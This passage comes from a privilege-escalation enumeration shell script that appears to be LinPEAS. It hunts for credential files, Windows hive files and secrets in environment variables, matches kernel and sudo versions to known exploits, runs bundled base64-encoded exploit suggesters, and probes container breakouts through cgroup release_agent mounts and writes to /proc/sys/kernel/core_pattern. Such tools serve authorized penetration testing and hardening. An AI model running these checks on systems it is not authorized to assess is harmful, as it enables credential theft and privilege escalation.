"\.bashrc$|\.google_authenticator$|hosts\.equiv$|\.lesshst$|\.plan$|\.profile$|\.recently-used\.xbel$|\.rhosts$|\.sudo_as_admin_successful$" | sort | uniq | head -n 70)
  1302	  PSTORAGE_WINDOWS=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.rdg$|AppEvent\.Evt$|autounattend\.xml$|ConsoleHost_history\.txt$|FreeSSHDservice\.ini$|NetSetup\.log$|Ntds\.dit$|protecteduserkey\.bin$|RDCMan\.settings$|SAM$|SYSTEM$|SecEvent\.Evt$|appcmd\.exe$|bash\.exe$|datasources\.xml$|default\.sav$|drives\.xml$|groups\.xml$|https-xampp\.conf$|https\.conf$|iis6\.log$|index\.dat$|my\.cnf$|my\.ini$|ntuser\.dat$|pagefile\.sys$|printers\.xml$|recentservers\.xml$|scclient\.exe$|scheduledtasks\.xml$|security\.sav$|server\.xml$|setupinfo$|setupinfo\.bak$|sitemanager\.xml$|sites\.ini$|software$|software\.sav$|sysprep\.inf$|sysprep\.xml$|system\.sav$|unattend\.inf$|unattend\.txt$|unattend\.xml$|unattended\.xml$|wcx_ftp\.ini$|ws_ftp\.ini$|web.*\.config$|winscp\.ini$|wsl\.exe$|plum\.sqlite$" | sort | uniq | head -n 70)
  1303	  PSTORAGE_DATABASE=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E '/man/|/usr/|/var/cache/|/man/|/usr/|/var/cache/|thumbcache|iconcache|IconCache' | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.db$|.*\.sqlite$|.*\.sqlite3$" | sort | uniq | head -n 70)
  1304	  PSTORAGE_BACKUPS=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "backup$|backups$" | sort | uniq | head -n 70)
  1305	  PSTORAGE_PASSWORD_FILES=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*password.*$|.*credential.*$|creds.*$|.*\.key$" | sort | uniq | head -n 70)
  1306	
  1307	
  1308	  ##### POST SERACH VARIABLES #####
  1309	  backup_folders_row="$(echo $PSTORAGE_BACKUPS | tr '\n' ' ')"
  1310	  printf ${YELLOW}"DONE\n"$NC
  1311	  echo ""
  1312	fi
  1313	
  1314	
  1315	
  1316	
  1317	
  1318	
  1319	
  1320	
  1321	
  1322	
  1323	
  1324	
  1325	
  1326	if echo $CHECKS | grep -q system_information; then
  1327	print_title "System Information"
  1328	###########################################
  1329	#-------------) System Info (-------------#
  1330	###########################################
  1331	
  1332	#-- SY) OS
  1333	print_2title "Operative system"
  1334	print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits"
  1335	(cat /proc/version || uname -a ) 2>/dev/null | sed -${E} "s,$kernelDCW_Ubuntu_Precise_1,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_2,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_3,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_4,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_5,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_6,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_1,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_2,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_3,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_4,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Xenial,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel5_1,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel5_2,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel5_3,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel6_1,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel6_2,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel6_3,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel6_4,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel7,${SED_RED_YELLOW}," | sed -${E} "s,$kernelB,${SED_RED},"
  1336	warn_exec lsb_release -a 2>/dev/null
  1337	if [ "$MACPEAS" ]; then
  1338	    warn_exec system_profiler SPSoftwareDataType
  1339	fi
  1340	echo ""
  1341	
  1342	#-- SY) Sudo
  1343	print_2title "Sudo version"
  1344	if [ "$(command -v sudo 2>/dev/null)" ]; then
  1345	print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version"
  1346	sudo -V 2>/dev/null | grep "Sudo ver" | sed -${E} "s,$sudovB,${SED_RED},"
  1347	else echo_not_found "sudo"
  1348	fi
  1349	echo ""
  1350	
  1351	#--SY) USBCreator
  1352	if (busctl list 2>/dev/null | grep -q com.ubuntu.USBCreator) || [ "$DEBUG" ]; then
  1353	    print_2title "USBCreator"
  1354	    print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation"
  1355	
  1356	    pc_version=$(dpkg -l 2>/dev/null | grep policykit-desktop-privileges | grep -oP "[0-9][0-9a-zA-Z\.]+")
  1357	    if [ -z "$pc_version" ]; then
  1358	        pc_version=$(apt-cache policy policykit-desktop-privileges 2>/dev/null | grep -oP "\*\*\*.*" | cut -d" " -f2)
  1359	    fi
  1360	    if [ -n "$pc_version" ]; then
  1361	        pc_length=${#pc_version}
  1362	        pc_major=$(echo "$pc_version" | cut -d. -f1)
  1363	        pc_minor=$(echo "$pc_version" | cut -d. -f2)
  1364	        if [ "$pc_length" -eq 4 ] && [ "$pc_major" -eq 0 ] && [ "$pc_minor"  -lt 21 ]; then
  1365	            echo "Vulnerable!!" | sed -${E} "s,.*,${SED_RED},"
  1366	        fi
  1367	    fi
  1368	fi
  1369	echo ""
  1370	
  1371	#-- SY) PATH
  1372	
  1373	print_2title "PATH"
  1374	print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses"
  1375	if ! [ "$IAMROOT" ]; then
  1376	    echo "$OLDPATH" 2>/dev/null | sed -${E} "s,$Wfolders|\./|\.:|:\.,${SED_RED_YELLOW},g"
  1377	fi
  1378	
  1379	if [ "$DEBUG" ]; then
  1380	     echo "New path exported: $PATH"
  1381	fi
  1382	echo ""
  1383	
  1384	#-- SY) Date
  1385	print_2title "Date & uptime"
  1386	warn_exec date 2>/dev/null
  1387	warn_exec uptime 2>/dev/null
  1388	echo ""
  1389	
  1390	#-- SY) System stats
  1391	if [ "$EXTRA_CHECKS" ]; then
  1392	    print_2title "System stats"
  1393	    (df -h || lsblk) 2>/dev/null || echo_not_found "df and lsblk"
  1394	    warn_exec free 2>/dev/null
  1395	    echo ""
  1396	fi
  1397	
  1398	#-- SY) CPU info
  1399	if [ "$EXTRA_CHECKS" ]; then
  1400	    print_2title "CPU info"
  1401	    warn_exec lscpu 2>/dev/null
  1402	    echo ""
  1403	fi
  1404	
  1405	if [ -d "/dev" ] || [ "$DEBUG" ] ; then
  1406	    print_2title "Any sd*/disk* disk in /dev? (limit 20)"
  1407	    ls /dev 2>/dev/null | grep -Ei "^sd|^disk" | sed "s,crypt,${SED_RED}," | head -n 20
  1408	    echo ""
  1409	fi
  1410	
  1411	if [ -f "/etc/fstab" ] || [ "$DEBUG" ]; then
  1412	    print_2title "Unmounted file-system?"
  1413	    print_info "Check if you can mount umounted devices"
  1414	    grep -v "^#" /etc/fstab 2>/dev/null | grep -Ev "\W+\#|^#" | sed -${E} "s,$mountG,${SED_GREEN},g" | sed -${E} "s,$notmounted,${SED_RED},g" | sed -${E} "s%$mounted%${SED_BLUE}%g" | sed -${E} "s,$Wfolders,${SED_RED}," | sed -${E} "s,$mountpermsB,${SED_RED},g" | sed -${E} "s,$mountpermsG,${SED_GREEN},g"
  1415	    echo ""
  1416	fi
  1417	
  1418	if ([ "$(command -v diskutil)" ] || [ "$DEBUG" ]) && [ "$EXTRA_CHECKS" ]; then
  1419	    print_2title "Mounted disks information"
  1420	    warn_exec diskutil list
  1421	    echo ""
  1422	fi
  1423	
  1424	if [ "$(command -v smbutil)" ] || [ "$DEBUG" ]; then
  1425	    print_2title "Mounted SMB Shares"
  1426	    warn_exec smbutil statshares -a
  1427	    echo ""
  1428	fi
  1429	
  1430	#-- SY) Environment vars
  1431	print_2title "Environment"
  1432	print_info "Any private information inside environment variables?"
  1433	(env || printenv || set) 2>/dev/null | grep -v "RELEVANT*|FIND*|^VERSION=|dbuslistG|mygroups|ldsoconfdG|pwd_inside_history|kernelDCW_Ubuntu_Precise|kernelDCW_Ubuntu_Trusty|kernelDCW_Ubuntu_Xenial|kernelDCW_Rhel|^sudovB=|^rootcommon=|^mounted=|^mountG=|^notmounted=|^mountpermsB=|^mountpermsG=|^kernelB=|^C=|^RED=|^GREEN=|^Y=|^B=|^NC=|TIMEOUT=|groupsB=|groupsVB=|knw_grps=|sidG|sidB=|sidVB=|sidVB2=|sudoB=|sudoG=|sudoVB=|timersG=|capsB=|notExtensions=|Wfolders=|writeB=|writeVB=|_usrs=|compiler=|PWD=|LS_COLORS=|pathshG=|notBackup=|processesDump|processesB|commonrootdirs|USEFUL_SOFTWARE|PSTORAGE_KUBERNETES" | sed -${E} "s,[pP][wW][dD]|[pP][aA][sS][sS][wW]|[aA][pP][iI][kK][eE][yY]|[aA][pP][iI][_][kK][eE][yY]|KRB5CCNAME,${SED_RED},g" || echo_not_found "env || set"
  1434	echo ""
  1435	
  1436	#-- SY) Dmesg
  1437	if [ "$(command -v dmesg 2>/dev/null)" ] || [ "$DEBUG" ]; then
  1438	    print_2title "Searching Signature verification failed in dmesg"
  1439	    print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed"
  1440	    (dmesg 2>/dev/null | grep "signature") || echo_not_found "dmesg"
  1441	    echo ""
  1442	fi
  1443	
  1444	#-- SY) Kernel extensions
  1445	if [ "$MACPEAS" ]; then
  1446	    print_2title "Kernel Extensions not belonging to apple"
  1447	    kextstat 2>/dev/null | grep -Ev " com.apple."
  1448	
  1449	    print_2title "Unsigned Kernel Extensions"
  1450	    macosNotSigned /Library/Extensions
  1451	    macosNotSigned /System/Library/Extensions
  1452	fi
  1453	
  1454	if [ "$(command -v bash 2>/dev/null)" ]; then
  1455	    print_2title "Executing Linux Exploit Suggester"
  1456	    print_info "https://github.com/mzet-/linux-exploit-suggester"
  1457	    les_b64=""
  1458	    echo $les_b64 | base64 -d | bash | sed "s,$(printf '\033')\\[[0-9;]*[a-zA-Z],,g" | grep -i "\[CVE" -A 10 | grep -Ev "^\-\-$" | sed -${E} "s,\[CVE-[0-9]+-[0-9]+\].*,${SED_RED},g"
  1459	    echo ""
  1460	fi
  1461	
  1462	if [ "$(command -v perl 2>/dev/null)" ]; then
  1463	    print_2title "Executing Linux Exploit Suggester 2"
  1464	    print_info "https://github.com/jondonas/linux-exploit-suggester-2"
  1465	    les2_b64=""
  1466	    echo $les2_b64 | base64 -d | perl 2>/dev/null | sed "s,$(printf '\033')\\[[0-9;]*[a-zA-Z],,g" | grep -i "CVE" -B 1 -A 10 | grep -Ev "^\-\-$" | sed -${E} "s,CVE-[0-9]+-[0-9]+,${SED_RED},g"
  1467	    echo ""
  1468	fi
  1469	
  1470	if [ "$MACPEAS" ] && [ "$(command -v brew 2>/dev/null)" ]; then
  1471	    print_2title "Brew Doctor Suggestions"
  1472	    brew doctor
  1473	    echo ""
  1474	fi
  1475	
  1476	
  1477	
  1478	#-- SY) AppArmor
  1479	print_2title "Protections"
  1480	print_list "AppArmor enabled? .............. "$NC
  1481	if [ "$(command -v aa-status 2>/dev/null)" ]; then
  1482	    aa-status 2>&1 | sed "s,disabled,${SED_RED},"
  1483	elif [ "$(command -v apparmor_status 2>/dev/null)" ]; then
  1484	    apparmor_status 2>&1 | sed "s,disabled,${SED_RED},"
  1485	elif [ "$(ls -d /etc/apparmor* 2>/dev/null)" ]; then
  1486	    ls -d /etc/apparmor*
  1487	else
  1488	    echo_not_found "AppArmor"
  1489	fi
  1490	
  1491	#-- SY) AppArmor2
  1492	print_list "AppArmor profile? .............. "$NC
  1493	(cat /proc/self/attr/current 2>/dev/null || echo "unconfined") | sed "s,unconfined,${SED_RED}," | sed "s,kernel,${SED_GREEN},"
  1494	
  1495	#-- SY) LinuxONE
  1496	print_list "is linuxONE? ................... "$NC
  1497	( (uname -a | grep "s390x" >/dev/null 2>&1) && echo "Yes" || echo_not_found "s390x")
  1498	
  1499	#-- SY) grsecurity
  1500	print_list "grsecurity present? ............ "$NC
  1501	( (uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo_not_found "grsecurity")
  1502	
  1503	#-- SY) PaX
  1504	print_list "PaX bins present? .............. "$NC
  1505	(command -v paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo_not_found "PaX")
  1506	
  1507	#-- SY) Execshield
  1508	print_list "Execshield enabled? ............ "$NC
  1509	(grep "exec-shield" /etc/sysctl.conf 2>/dev/null || echo_not_found "Execshield") | sed "s,=0,${SED_RED},"
  1510	
  1511	#-- SY) SElinux
  1512	print_list "SELinux enabled? ............... "$NC
  1513	(sestatus 2>/dev/null || echo_not_found "sestatus") | sed "s,disabled,${SED_RED},"
  1514	
  1515	#-- SY) Seccomp
  1516	print_list "Seccomp enabled? ............... "$NC
  1517	([ "$(grep Seccomp /proc/self/status 2>/dev/null | grep -v 0)" ] && echo "enabled" || echo "disabled") | sed "s,disabled,${SED_RED}," | sed "s,enabled,${SED_GREEN},"
  1518	
  1519	#-- SY) AppArmor
  1520	print_list "User namespace? ................ "$NC
  1521	if [ "$(cat /proc/self/uid_map 2>/dev/null)" ]; then echo "enabled" | sed "s,enabled,${SED_GREEN},"; else echo "disabled" | sed "s,disabled,${SED_RED},"; fi
  1522	
  1523	#-- SY) cgroup2
  1524	print_list "Cgroup2 enabled? ............... "$NC
  1525	([ "$(grep cgroup2 /proc/filesystems 2>/dev/null)" ] && echo "enabled" || echo "disabled") | sed "s,disabled,${SED_RED}," | sed "s,enabled,${SED_GREEN},"
  1526	
  1527	#-- SY) Gatekeeper
  1528	if [ "$MACPEAS" ]; then
  1529	    print_list "Gatekeeper enabled? .......... "$NC
  1530	    (spctl --status 2>/dev/null || echo_not_found "sestatus") | sed "s,disabled,${SED_RED},"
  1531	
  1532	    print_list "sleepimage encrypted? ........ "$NC
  1533	    (sysctl vm.swapusage | grep "encrypted" | sed "s,encrypted,${SED_GREEN},") || echo_no
  1534	
  1535	    print_list "XProtect? .................... "$NC
  1536	    (system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5 | grep -Iv "^$") || echo_no
  1537	
  1538	    print_list "SIP enabled? ................. "$NC
  1539	    csrutil status | sed "s,enabled,${SED_GREEN}," | sed "s,disabled,${SED_RED}," || echo_no
  1540	
  1541	    print_list "Connected to JAMF? ........... "$NC
  1542	    warn_exec jamf checkJSSConnection
  1543	
  1544	    print_list "Connected to AD? ............. "$NC
  1545	    dsconfigad -show && echo "" || echo_no
  1546	fi
  1547	
  1548	#-- SY) ASLR
  1549	print_list "Is ASLR enabled? ............... "$NC
  1550	ASLR=$(cat /proc/sys/kernel/randomize_va_space 2>/dev/null)
  1551	if [ -z "$ASLR" ]; then
  1552	    echo_not_found "/proc/sys/kernel/randomize_va_space";
  1553	else
  1554	    if [ "$ASLR" -eq "0" ]; then printf $RED"No"$NC; else printf $GREEN"Yes"$NC; fi
  1555	    echo ""
  1556	fi
  1557	
  1558	#-- SY) Printer
  1559	print_list "Printer? ....................... "$NC
  1560	(lpstat -a || system_profiler SPPrintersDataType || echo_no) 2>/dev/null
  1561	
  1562	#-- SY) Running in a virtual environment
  1563	print_list "Is this a virtual machine? ..... "$NC
  1564	hypervisorflag=$(grep flags /proc/cpuinfo 2>/dev/null | grep hypervisor)
  1565	if [ "$(command -v systemd-detect-virt 2>/dev/null)" ]; then
  1566	    detectedvirt=$(systemd-detect-virt)
  1567	    if [ "$hypervisorflag" ]; then printf $RED"Yes ($detectedvirt)"$NC; else printf $GREEN"No"$NC; fi
  1568	else
  1569	    if [ "$hypervisorflag" ]; then printf $RED"Yes"$NC; else printf $GREEN"No"$NC; fi
  1570	fi
  1571	
  1572	fi
  1573	echo ''
  1574	echo ''
  1575	if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi
  1576	
  1577	if echo $CHECKS | grep -q container; then
  1578	print_title "Container"
  1579	###########################################
  1580	#---------) Container functions (---------#
  1581	###########################################
  1582	
  1583	containerCheck() {
  1584	  inContainer=""
  1585	  containerType="$(echo_no)"
  1586	
  1587	  # Are we inside docker?
  1588	  if [ -f "/.dockerenv" ] ||
  1589	    grep "/docker/" /proc/1/cgroup -qa 2>/dev/null ||
  1590	    grep -qai docker /proc/self/cgroup  2>/dev/null ||
  1591	    [ "$(find / -maxdepth 3 -name '*dockerenv*' -exec ls -la {} \; 2>/dev/null)" ] ; then
  1592	
  1593	    inContainer="1"
  1594	    containerType="docker\n"
  1595	  fi
  1596	
  1597	  # Are we inside kubenetes?
  1598	  if grep "/kubepod" /proc/1/cgroup -qa 2>/dev/null ||
  1599	    grep -qai kubepods /proc/self/cgroup 2>/dev/null; then
  1600	
  1601	    inContainer="1"
  1602	    if [ "$containerType" ]; then containerType="$containerType (kubernetes)\n"
  1603	    else containerType="kubernetes\n"
  1604	    fi
  1605	  fi
  1606	  
  1607	  # Inside concourse?
  1608	  if grep "/concourse" /proc/1/mounts -qa 2>/dev/null; then
  1609	    inContainer="1"
  1610	    if [ "$containerType" ]; then 
  1611	      containerType="$containerType (concourse)\n"
  1612	    fi
  1613	  fi
  1614	
  1615	  # Are we inside LXC?
  1616	  if env | grep "container=lxc" -qa 2>/dev/null ||
  1617	      grep "/lxc/" /proc/1/cgroup -qa 2>/dev/null; then
  1618	
  1619	    inContainer="1"
  1620	    containerType="lxc\n"
  1621	  fi
  1622	
  1623	  # Are we inside podman?
  1624	  if env | grep -qa "container=podman" 2>/dev/null ||
  1625	      grep -qa "container=podman" /proc/1/environ 2>/dev/null; then
  1626	
  1627	    inContainer="1"
  1628	    containerType="podman\n"
  1629	  fi
  1630	
  1631	  # Check for other container platforms that report themselves in PID 1 env
  1632	  if [ -z "$inContainer" ]; then
  1633	    if grep -a 'container=' /proc/1/environ 2>/dev/null; then
  1634	      inContainer="1"
  1635	      containerType="$(grep -a 'container=' /proc/1/environ | cut -d= -f2)\n"
  1636	    fi
  1637	  fi
  1638	}
  1639	
  1640	inDockerGroup() {
  1641	  DOCKER_GROUP="No"
  1642	  if groups 2>/dev/null | grep -q '\bdocker\b'; then
  1643	    DOCKER_GROUP="Yes"
  1644	  fi
  1645	}
  1646	
  1647	checkDockerRootless() {
  1648	  DOCKER_ROOTLESS="No"
  1649	  if docker info 2>/dev/null|grep -q rootless; then
  1650	    DOCKER_ROOTLESS="Yes ($TIP_DOCKER_ROOTLESS)"
  1651	  fi
  1652	}
  1653	
  1654	enumerateDockerSockets() {
  1655	  dockerVersion="$(echo_not_found)"
  1656	  if ! [ "$SEARCHED_DOCKER_SOCKETS" ]; then
  1657	    SEARCHED_DOCKER_SOCKETS="1"
  1658	    for int_sock in $(find / ! -path "/sys/*" -type s -name "docker.sock" -o -name "docker.socket" -o -name "dockershim.sock" -o -name "containerd.sock" -o -name "crio.sock" -o -name "frakti.sock" -o -name "rktlet.sock" 2>/dev/null); do
  1659	      if ! [ "$IAMROOT" ] && [ -w "$int_sock" ]; then
  1660	        if echo "$int_sock" | grep -Eq "docker"; then
  1661	          dock_sock="$int_sock"
  1662	          echo "You have write permissions over Docker socket $dock_sock" | sed -${E} "s,$dock_sock,${SED_RED_YELLOW},g"
  1663	          echo "Docker enummeration:"
  1664	          docker_enumerated=""
  1665	
  1666	          if [ "$(command -v curl)" ]; then
  1667	            sockInfoResponse="$(curl -s --unix-socket $dock_sock http://localhost/info)"
  1668	            dockerVersion=$(echo "$sockInfoResponse" | tr ',' '\n' | grep 'ServerVersion' | cut -d'"' -f 4)
  1669	            echo $sockInfoResponse | tr ',' '\n' | grep -E "$GREP_DOCKER_SOCK_INFOS" | grep -v "$GREP_DOCKER_SOCK_INFOS_IGNORE" | tr -d '"'
  1670	            if [ "$sockInfoResponse" ]; then docker_enumerated="1"; fi
  1671	          fi
  1672	
  1673	          if [ "$(command -v docker)" ] && ! [ "$docker_enumerated" ]; then
  1674	            sockInfoResponse="$(docker info)"
  1675	            dockerVersion=$(echo "$sockInfoResponse" | tr ',' '\n' | grep 'Server Version' | cut -d' ' -f 4)
  1676	            printf "$sockInfoResponse" | tr ',' '\n' | grep -E "$GREP_DOCKER_SOCK_INFOS" | grep -v "$GREP_DOCKER_SOCK_INFOS_IGNORE" | tr -d '"'
  1677	          fi
  1678	        
  1679	        else
  1680	          echo "You have write permissions over interesting socket $int_sock" | sed -${E} "s,$int_sock,${SED_RED},g"
  1681	        fi
  1682	
  1683	      else
  1684	        echo "You don't have write permissions over interesting socket $int_sock" | sed -${E} "s,$int_sock,${SED_GREEN},g"
  1685	      fi
  1686	    done
  1687	  fi
  1688	}
  1689	
  1690	checkDockerVersionExploits() {
  1691	  if echo "$dockerVersion" | grep -iq "not found"; then
  1692	    VULN_CVE_2019_13139="$(echo_not_found)"
  1693	    VULN_CVE_2019_5736="$(echo_not_found)"
  1694	    return
  1695	  fi
  1696	
  1697	  VULN_CVE_2019_13139="$(echo_no)"
  1698	  if [ "$(echo $dockerVersion | sed 's,\.,,g')" -lt "1895" ]; then
  1699	    VULN_CVE_2019_13139="Yes"
  1700	  fi
  1701	
  1702	  VULN_CVE_2019_5736="$(echo_no)"
  1703	  if [ "$(echo $dockerVersion | sed 's,\.,,g')" -lt "1893" ]; then
  1704	    VULN_CVE_2019_5736="Yes"
  1705	  fi
  1706	}
  1707	
  1708	checkContainerExploits() {
  1709	  VULN_CVE_2019_5021="$(echo_no)"
  1710	  if [ -f "/etc/alpine-release" ]; then
  1711	    alpineVersion=$(cat /etc/alpine-release)
  1712	    if [ "$(echo $alpineVersion | sed 's,\.,,g')" -ge "330" ] && [ "$(echo $alpineVersion | sed 's,\.,,g')" -le "360" ]; then
  1713	      VULN_CVE_2019_5021="Yes"
  1714	    fi
  1715	  fi
  1716	}
  1717	
  1718	checkCreateReleaseAgent(){
  1719	  cat /proc/$$/cgroup 2>/dev/null | grep -Eo '[0-9]+:[^:]+' | grep -Eo '[^:]+$' | while read -r subsys
  1720	  do
  1721	      if unshare -UrmC --propagation=unchanged bash -c "mount -t cgroup -o $subsys cgroup /tmp/cgroup_3628d4 2>&1 >/dev/null && test -w /tmp/cgroup_3628d4/release_agent" >/dev/null 2>&1 ; then
  1722	          release_agent_breakout2="Yes (unshare with $subsys)";
  1723	          rm -rf /tmp/cgroup_3628d4
  1724	          break
  1725	      fi
  1726	  done
  1727	}
  1728	
  1729	checkProcSysBreakouts(){
  1730	  dev_mounted="No"
  1731	  if [ $(ls -l /dev | grep -E "^c" | wc -l) -gt 50 ]; then
  1732	    dev_mounted="Yes";
  1733	  fi
  1734	
  1735	  proc_mounted="No"
  1736	  if [ $(ls /proc | grep -E "^[0-9]" | wc -l) -gt 50 ]; then
  1737	    proc_mounted="Yes";
  1738	  fi
  1739	
  1740	  run_unshare=$(unshare -UrmC bash -c 'echo -n Yes' 2>/dev/null)
  1741	  if ! [ "$run_unshare" = "Yes" ]; then
  1742	    run_unshare="No"
  1743	  fi
  1744	
  1745	  if [ "$(ls -l /sys/fs/cgroup/*/release_agent 2>/dev/null)" ]; then 
  1746	    release_agent_breakout1="Yes"
  1747	  else 
  1748	    release_agent_breakout1="No"
  1749	  fi
  1750	  
  1751	  release_agent_breakout2="No"
  1752	  mkdir /tmp/cgroup_3628d4
  1753	  mount -t cgroup -o memory cgroup /tmp/cgroup_3628d4 2>/dev/null
  1754	  if [ $? -eq 0 ]; then 
  1755	    release_agent_breakout2="Yes"; 
  1756	    rm -rf /tmp/cgroup_3628d4
  1757	  else 
  1758	    mount -t cgroup -o rdma cgroup /tmp/cgroup_3628d4 2>/dev/null
  1759	    if [ $? -eq 0 ]; then 
  1760	      release_agent_breakout2="Yes"; 
  1761	      rm -rf /tmp/cgroup_3628d4
  1762	    else 
  1763	      checkCreateReleaseAgent
  1764	    fi
  1765	  fi
  1766	  rm -rf /tmp/cgroup_3628d4 2>/dev/null
  1767	  
  1768	  core_pattern_breakout="$( (echo -n '' > /proc/sys/kernel/core_pattern && echo Yes) 2>/dev/null || echo No)"
  1769	  modprobe_present="$(ls -l `cat /proc/sys/kernel/modprobe` 2>/dev/null || echo No)"
  1770	  panic_on_oom_dos="$( (echo -n '' > /proc/sys/vm/panic_on_oom && echo Yes) 2>/dev/null || echo No)"
  1771	  panic_sys_fs_dos="$( (echo -n '' > /proc/sys/fs/suid_dumpable && echo Yes) 2>/dev/null || echo No)"
